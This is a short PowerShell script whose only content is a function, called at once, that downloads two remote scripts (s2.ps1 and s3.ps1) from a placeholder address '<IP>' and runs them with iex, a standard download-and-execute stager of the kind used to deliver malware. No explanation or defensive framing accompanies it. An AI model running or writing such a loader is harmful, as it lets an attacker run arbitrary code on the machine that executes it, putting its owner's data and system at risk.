function load_init
{
	iex(new-object net.webclient).downloadString('http://<IP>/s2.ps1')
	iex(new-object net.webclient).downloadString('http://<IP>/s3.ps1')
}
load_init

